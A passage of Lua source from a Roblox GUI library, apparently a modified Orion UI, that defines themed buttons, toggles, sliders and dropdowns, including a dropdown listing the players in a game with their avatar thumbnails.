						Position = UDim2.new(1, -30, 0, 7),
					}), "TextDark"),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					Click
				}), "Second")

				ButtonLabel.Text = ButtonConfig.Name
				
				-- Registrar elemento para pesquisa (COM referência do Frame)
				table.insert(SearchableElements, {
					Name = ButtonConfig.Name,
					TabName = TabConfig.Name,
					Type = "Button",
					Frame = ButtonFrame
				})

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(ButtonFrame, TweenCache.Buttery, {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 8, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 8, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 8)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(ButtonFrame, TweenCache.Buttery, {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(ButtonFrame, TweenCache.Buttery, {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 8, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 8, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 8)}):Play()
					task.spawn(function()
						ButtonConfig.Callback()
					end)
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(ButtonFrame, TweenCache.UltraFast, {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 12, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 12, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 12)}):Play()
				end)

				function Button:Set(ButtonText)
					ButtonFrame.Content.Text = ButtonText
				end	

				return Button
			end

			function ElementFunction:AddToggle(ToggleConfig)
				ToggleConfig = ToggleConfig or {}
				ToggleConfig.Name = ToggleConfig.Name or "Toggle"
				ToggleConfig.Default = ToggleConfig.Default or false
				ToggleConfig.Callback = ToggleConfig.Callback or function() end
				ToggleConfig.Color = ToggleConfig.Color or OrionLib.Themes[OrionLib.SelectedTheme].Stroke
				ToggleConfig.Flag = ToggleConfig.Flag or nil
				ToggleConfig.Save = ToggleConfig.Save or false

				local Toggle = {Value = ToggleConfig.Default, Save = ToggleConfig.Save}

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0),
					ZIndex = 5,
					Active = true
				})

				local ToggleBox = SetChildren(SetProps(MakeElement("RoundFrame", ToggleConfig.Color, 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -24, 0.5, 0),
					AnchorPoint = Vector2.new(0.5, 0.5)
				}), {
					SetProps(MakeElement("Stroke"), {
						Color = ToggleConfig.Color,
						Name = "Stroke",
						Transparency = 0.5
					}),
					SetProps(MakeElement("Image", "rbxassetid://3944680095"), {
						Size = UDim2.new(0, 20, 0, 20),
						AnchorPoint = Vector2.new(0.5, 0.5),
						Position = UDim2.new(0.5, 0, 0.5, 0),
						ImageColor3 = Color3.fromRGB(255, 255, 255),
						Name = "Ico"
					}),
				})

				local ToggleFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement("Label", ToggleConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = "Content"
					}), "Text"),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					ToggleBox,
					Click
				}), "Second")
				
				-- Registrar elemento para pesquisa (COM referência do Frame)
				table.insert(SearchableElements, {
					Name = ToggleConfig.Name,
					TabName = TabConfig.Name,
					Type = "Toggle",
					Frame = ToggleFrame  -- ✅ REFERÊNCIA DO FRAME VISUAL
				})

				function Toggle:Set(Value)
					Toggle.Value = Value
					local currentColor = OrionLib.Themes[OrionLib.SelectedTheme].Stroke
					local offColor = Color3.fromRGB(
						math.clamp(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 - 10, 0, 255),
						math.clamp(OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 - 10, 0, 255),
						math.clamp(OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 - 10, 0, 255)
					)
					TweenService:Create(ToggleBox, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Toggle.Value and currentColor or offColor}):Play()
					TweenService:Create(ToggleBox.Stroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Toggle.Value and currentColor or Color3.fromRGB(80, 80, 80), Transparency = Toggle.Value and 0.5 or 0.7}):Play()
					TweenService:Create(ToggleBox.Ico, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = Toggle.Value and 0 or 1, Size = Toggle.Value and UDim2.new(0, 20, 0, 20) or UDim2.new(0, 8, 0, 8)}):Play()
					ToggleConfig.Callback(Toggle.Value)
				end    

				-- Aplicar estado inicial do toggle
				task.spawn(function()
					Toggle:Set(Toggle.Value)
				end)

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Click, function()
					Toggle:Set(not Toggle.Value)
					SaveCfg(game.GameId)
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				if ToggleConfig.Flag then
					OrionLib.Flags[ToggleConfig.Flag] = Toggle
				end	
				return Toggle
			end

			function ElementFunction:AddSlider(SliderConfig)
				SliderConfig = SliderConfig or {}
				SliderConfig.Name = SliderConfig.Name or "Slider"
				SliderConfig.Min = SliderConfig.Min or 0
				SliderConfig.Max = SliderConfig.Max or 100
				SliderConfig.Increment = SliderConfig.Increment or 1
				SliderConfig.Default = SliderConfig.Default or 50
				SliderConfig.Callback = SliderConfig.Callback or function() end
				SliderConfig.ValueName = SliderConfig.ValueName or ""
				SliderConfig.Color = SliderConfig.Color or OrionLib.Themes[OrionLib.SelectedTheme].Stroke
				SliderConfig.Flag = SliderConfig.Flag or nil
				SliderConfig.Save = SliderConfig.Save or false

				local Slider = {Value = SliderConfig.Default, Save = SliderConfig.Save}
				local Dragging = false

				local SliderDrag = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
					Size = UDim2.new(0, 0, 1, 0),
					BackgroundTransparency = 0.3,
					ClipsDescendants = true
				}), {
					AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 6),
						Font = Enum.Font.GothamBold,
						Name = "Value",
						TextTransparency = 0
					}), "Text")
				}), "Stroke")

				local SliderBar = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
					Size = UDim2.new(1, -24, 0, 26),
					Position = UDim2.new(0, 12, 0, 30),
					BackgroundTransparency = 0.9
				}), {
					AddThemeObject(SetProps(MakeElement("Stroke"), {
						Color = SliderConfig.Color
					}), "Stroke"),
					AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 6),
						Font = Enum.Font.GothamBold,
						Name = "Value",
						TextTransparency = 0.8
					}), "Text"),
					SliderDrag
				}), "Stroke")

				local SliderFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(1, 0, 0, 65),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement("Label", SliderConfig.Name, 15), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 10),
						Font = Enum.Font.GothamBold,
						Name = "Content"
					}), "Text"),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					SliderBar
				}), "Second")
				
				-- Registrar elemento para pesquisa (COM referência do Frame)
				table.insert(SearchableElements, {
					Name = SliderConfig.Name,
					TabName = TabConfig.Name,
					Type = "Slider",
					Frame = SliderFrame
				})

				local Dragging, DragInput, MousePos, FramePos = false

				AddConnection(SliderBar.InputBegan, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
						Dragging = true
						MousePos = Input.Position
						FramePos = SliderBar.Position
		
						AddConnection(Input.Changed, function()
							if Input.UserInputState == Enum.UserInputState.End then
								Dragging = false
								FocusDrag = nil
							end
						end)
					end
				end)
				AddConnection(SliderBar.InputChanged, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
						DragInput = Input
						FocusDrag = DragInput
					end
				end)

				AddConnection(UserInputService.InputChanged, function(Input)
					if Input == DragInput and Input == FocusDrag and Dragging then
						local SizeScale = math.clamp((Input.Position.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
						Slider:Set(SliderConfig.Min + ((SliderConfig.Max - SliderConfig.Min) * SizeScale)) 
						SaveCfg(game.GameId)
					end
				end)
				
				function Slider:Set(Value)
					self.Value = math.clamp(Round(Value, SliderConfig.Increment), SliderConfig.Min, SliderConfig.Max)
					TweenService:Create(SliderDrag,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = UDim2.fromScale((self.Value - SliderConfig.Min) / (SliderConfig.Max - SliderConfig.Min), 1)}):Play()
					SliderBar.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
					SliderDrag.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
					SliderConfig.Callback(self.Value)
				end      

				Slider:Set(Slider.Value)
				if SliderConfig.Flag then				
					OrionLib.Flags[SliderConfig.Flag] = Slider
				end
				return Slider
			end

			function ElementFunction:AddMultipleDropdown(DropdownConfig)
				DropdownConfig = DropdownConfig or {}
				DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
				DropdownConfig.Options = DropdownConfig.Options or {}
				DropdownConfig.Default = DropdownConfig.Default or ""
				DropdownConfig.Callback = DropdownConfig.Callback or function() end
				DropdownConfig.Flag = DropdownConfig.Flag or nil
				DropdownConfig.Save = DropdownConfig.Save or false

				local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save}
				local MaxElements = 5

				if not table.find(Dropdown.Options, Dropdown.Value) then
					Dropdown.Value = "..."
				end

				local SelectedValues = {}

				local DropdownList = MakeElement("List")

				local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
					DropdownList
				}), {
					Parent = ItemParent,
					Position = UDim2.new(0, 0, 0, 38),
					Size = UDim2.new(1, 0, 1, -38),
					ClipsDescendants = true
				}), "Divider")

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent,
					ClipsDescendants = true
				}), {
					DropdownContainer,
					SetProps(SetChildren(MakeElement("TFrame"), {
						AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = "Content"
						}), "Text"),
						AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
							Size = UDim2.new(0, 20, 0, 20),
							AnchorPoint = Vector2.new(0, 0.5),
							Position = UDim2.new(1, -30, 0.5, 0),
							ImageColor3 = Color3.fromRGB(240, 240, 240),
							Name = "Ico"
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
							Size = UDim2.new(1, -40, 1, 0),
							Font = Enum.Font.Gotham,
							Name = "Selected",
							TextXAlignment = Enum.TextXAlignment.Right
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Frame"), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = "Line",
							Visible = false
						}), "Stroke"), 
						Click
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = "F"
					}),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					MakeElement("Corner")
				}), "Second")

				AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
					DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
				end)  

				local function AddOptions(Options)
					for _, Option in pairs(Options) do
						local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
							MakeElement("Corner", 0, 6),
							AddThemeObject(SetProps(MakeElement("Label", Option, 13, 0.4), {
								Position = UDim2.new(0, 8, 0, 0),
								Size = UDim2.new(1, -8, 1, 0),
								Name = "Title"
							}), "Text")
						}), {
							Parent = DropdownContainer,
							Size = UDim2.new(1, 0, 0, 28),
							BackgroundTransparency = 1,
							ClipsDescendants = true
						}), "Divider")

						AddConnection(OptionBtn.MouseButton1Click, function()
							Dropdown:Set(Option)
							SaveCfg(game.GameId)
						end)

						Dropdown.Buttons[Option] = OptionBtn
					end
				end	

				function Dropdown:Refresh(Options, Delete)
					if Delete then
						for _,v in pairs(Dropdown.Buttons) do
							v:Destroy()
						end    
						table.clear(Dropdown.Options)
						table.clear(Dropdown.Buttons)
					end
					Dropdown.Options = Options
					AddOptions(Dropdown.Options)
				end  

				function Dropdown:Set(Value)
					local n = table.find(SelectedValues, Value)
					local text = ""

					if not n then
						-- Adicionado
						table.insert(SelectedValues, Value)
						DropdownFrame.F.Selected.Text = Dropdown.Value
						TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
						TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					else
						-- Removido
						table.remove(SelectedValues, n)
						TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
						TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
					end

					for i, v in pairs(SelectedValues) do
						if #SelectedValues == i then
							text = text .. v
						else
							text = text .. v .. ", "
						end
					end

					Dropdown.Value = Value
					DropdownFrame.F.Selected.Text = text

					return DropdownConfig.Callback(SelectedValues)
				end

				AddConnection(Click.MouseButton1Click, function()
					Dropdown.Toggled = not Dropdown.Toggled
					DropdownFrame.F.Line.Visible = Dropdown.Toggled
					TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
					if #Dropdown.Options > MaxElements then
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
					else
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
					end
				end)

				Dropdown:Refresh(Dropdown.Options, false)
				Dropdown:Set(Dropdown.Value)
				if DropdownConfig.Flag then				
					OrionLib.Flags[DropdownConfig.Flag] = Dropdown
				end
				
				return Dropdown
			end

			function ElementFunction:AddPlayersDropdown(DropdownConfig)
				DropdownConfig = DropdownConfig or {}
				DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
				DropdownConfig.Options = DropdownConfig.Options or {}
				DropdownConfig.RemoveDp = DropdownConfig.RemoveDP or false
				DropdownConfig.Default = DropdownConfig.Default or ""
				DropdownConfig.Callback = DropdownConfig.Callback or function() end
				DropdownConfig.Flag = DropdownConfig.Flag or nil
				DropdownConfig.MultipleSelection = DropdownConfig.MultipleSelection or false
				DropdownConfig.Save = DropdownConfig.Save or false

				local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save, MultipleSelection = DropdownConfig.MultipleSelection}
				local MaxElements = 3

				if not table.find(Dropdown.Options, Dropdown.Value) then
					Dropdown.Value = "..."
				end

				local SelectedValues = {}
				local Options = 0

				local DropdownList = MakeElement("List")

				local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
					DropdownList
				}), {
					Parent = ItemParent,
					Position = UDim2.new(0, 0, 0, 38),
					Size = UDim2.new(1, 0, 1, -38),
					ClipsDescendants = true
				}), "Divider")

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent,
					ClipsDescendants = true
				}), {
					DropdownContainer,
					SetProps(SetChildren(MakeElement("TFrame"), {
						AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = "Content"
						}), "Text"),
						AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
							Size = UDim2.new(0, 20, 0, 20),
							AnchorPoint = Vector2.new(0, 0.5),
							Position = UDim2.new(1, -30, 0.5, 0),
							ImageColor3 = Color3.fromRGB(240, 240, 240),
							Name = "Ico"
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
							Size = UDim2.new(1, -40, 1, 0),
							Font = Enum.Font.Gotham,
							Name = "Selected",
							TextXAlignment = Enum.TextXAlignment.Right
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Frame"), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = "Line",
							Visible = false
						}), "Stroke"), 
						Click
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = "F"
					}),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					MakeElement("Corner")
				}), "Second")

				AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
					DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)

					if Options <= MaxElements then
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (Options * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
					end
				end)

				local function RemoveOption(Option)
					if Dropdown.Buttons[Option] then
						local n = table.find(SelectedValues, Option)

						if n then
							Dropdown.Buttons[Option].State.Visible = true
							TweenService:Create(Dropdown.Buttons[Option],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(200, 80, 80)}):Play()
						else
							Dropdown.Buttons[Option]:Destroy()
							Dropdown.Buttons[Option] = nil
							Options = Options - 1
						end
					end
				end

				local function AddOption(Option)
					local Player_Name = Option.Name
					local Player_Display = Option.DisplayName
					local UId = Option.UserId

					local Option = Player_Name

					if not Dropdown.Buttons[Option] then
						local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
							MakeElement("Corner", 0, 6),
							SetProps(MakeElement("Image", "https://www.roblox.com/headshot-thumbnail/image?userId=".. UId .."&width=420&height=420&format=png"), {
								Size = UDim2.new(0, 40, 0, 40),
								AnchorPoint = Vector2.new(0.5, 0.5),
								Position = UDim2.new(0.05, 0, 0.5, 0),
								ImageColor3 = Color3.fromRGB(240, 240, 240),
								Name = "Icon"
							}),

							SetProps(MakeElement("Image", "rbxassetid://118759916599176"), {
								Size = UDim2.new(0, 35, 0, 35),
								AnchorPoint = Vector2.new(0.5, 0.5),
								Position = UDim2.new(0.94, 0, 0.5, 0),
								ImageColor3 = Color3.fromRGB(41, 0, 5),
								Name = "State",
								Visible = false
							}),

							AddThemeObject(SetProps(MakeElement("Label", "@" .. Option, 13, 0.4), {
								Position = UDim2.new(0.135, 0, 0, 7),
								Size = UDim2.new(1, -10, 1, 0),
								Name = "Title"
							}), "Text"),

							AddThemeObject(SetProps(MakeElement("Label", Player_Display, 17, 0.4), {
								Position = UDim2.new(0.135, 0, 0, -5),
								Size = UDim2.new(1, -8, 1, 0),
								Name = "Subtitle"
							}), "Text"),
						}), {
							Parent = DropdownContainer,
							Size = UDim2.new(1, 0, 0, 45),
							BackgroundTransparency = 1,
							ClipsDescendants = true
						}), "Divider")

						AddConnection(OptionBtn.MouseButton1Click, function()
							Dropdown:Set(Option)
							SaveCfg(game.GameId)
						end)

						Dropdown.Buttons[Option] = OptionBtn
						Options = Options + 1
					else
						local n = table.find(SelectedValues, Option)

						if n then
							Dropdown.Buttons[Option].State.Visible = false
							TweenService:Create(Dropdown.Buttons[Option],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme]["Divider"]}):Play()
						else
							Dropdown.Buttons[Option]:Destroy()
							Dropdown.Buttons[Option] = nil
							Options = Options - 1
						end
					end
				end

				for _, p in pairs(PlayerService:GetPlayers()) do
					AddOption(p)
				end

				PlayerService.PlayerAdded:Connect(function(p) 
					AddOption(p)
				end)

				PlayerService.PlayerRemoving:Connect(function(p) 
					RemoveOption(p.Name)
				end)

				local function DeleteAllDisconnectedPlayers()
					for i, v in pairs(Dropdown.Buttons) do
						if v and v:FindFirstChild("State") and v["State"].Visible then
							Dropdown.Buttons[i]:Destroy()
							Dropdown.Buttons[i] = nil
							Options = Options - 1
						end
					end
				end

				function Dropdown:Refresh() end

				function Dropdown:Set(Value, Once)
					local n = table.find(SelectedValues, Value)
					local text = ""
					local Button = Dropdown.Buttons[Value]

					if not Button then
						for i = 0, 10 do
							if Dropdown.Buttons[Value] then
								Button = Dropdown.Buttons[Value]
								break
							end
							wait(0.15)
						end
					end
					
					if Button then
						if Dropdown.MultipleSelection then
							if not n then
								-- Adicionado
								table.insert(SelectedValues, Value)
								DropdownFrame.F.Selected.Text = Dropdown.Value
								TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0.5}):Play()
								TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
							elseif n and not Once then
								-- Removido
								table.remove(SelectedValues, n)
		
								if Dropdown.Buttons[Value].State.Visible then
									Dropdown.Buttons[Value]:Destroy()
									Dropdown.Buttons[Value] = nil
									Options = Options - 1
								else
									TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
									TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
								end
							end
		
							for i, v in pairs(SelectedValues) do
								if #SelectedValues == 1 then
									text = text .. v
								elseif i > 3 then
									text = text .. "..."
									break
								else
									text = text .. v .. ", "
								end
							end
							
							Dropdown.Value = Value
							DropdownFrame.F.Selected.Text = text
		
							return DropdownConfig.Callback(SelectedValues)
						else
							table.clear(SelectedValues); table.insert(SelectedValues, Value)

							DeleteAllDisconnectedPlayers()

							for _, v in pairs(Dropdown.Buttons) do
								TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
								TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
							end

							if Dropdown.Buttons[Value] then
								TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0.5}):Play()
								TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
								
								Dropdown.Value = Value
								DropdownFrame.F.Selected.Text = Dropdown.Value
							else
								Dropdown.Value = nil
								DropdownFrame.F.Selected.Text = ""
							end

							return DropdownConfig.Callback(Dropdown.Value)
						end
					end
				end

				AddConnection(Click.MouseButton1Click, function()
					Dropdown.Toggled = not Dropdown.Toggled
					DropdownFrame.F.Line.Visible = Dropdown.Toggled
					TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()

					if Options > MaxElements then
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
					else
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (Options * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
					end
					
				end)

				if DropdownConfig.Flag then				
					OrionLib.Flags[DropdownConfig.Flag] = Dropdown
				end
				
				return Dropdown
			end

			function ElementFunction:AddDropdown(DropdownConfig)
				DropdownConfig = DropdownConfig or {}
				DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
				DropdownConfig.Options = DropdownConfig.Options or {}
				DropdownConfig.Default = DropdownConfig.Default or ""
				DropdownConfig.Callback = DropdownConfig.Callback or function() end
				DropdownConfig.Flag = DropdownConfig.Flag or nil
				DropdownConfig.Save = DropdownConfig.Save or false

				local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save}
				local MaxElements = 5
				local DropdownFrame  -- Declarar antes para registrar depois

				if not table.find(Dropdown.Options, Dropdown.Value) then
					Dropdown.Value = "..."
				end

				local DropdownList = MakeElement("List")

				local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
					DropdownList
				}), {
					Parent = ItemParent,
					Position = UDim2.new(0, 0, 0, 38),
					Size = UDim2.new(1, 0, 1, -38),
					ClipsDescendants = true
				}), "Divider")

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent,
					ClipsDescendants = true
				}), {
					DropdownContainer,
					SetProps(SetChildren(MakeElement("TFrame"), {
						AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = "Content"
						}), "Text"),
						AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
							Size = UDim2.new(0, 20, 0, 20),
							AnchorPoint = Vector2.new(0, 0.5),
							Position = UDim2.new(1, -30, 0.5, 0),
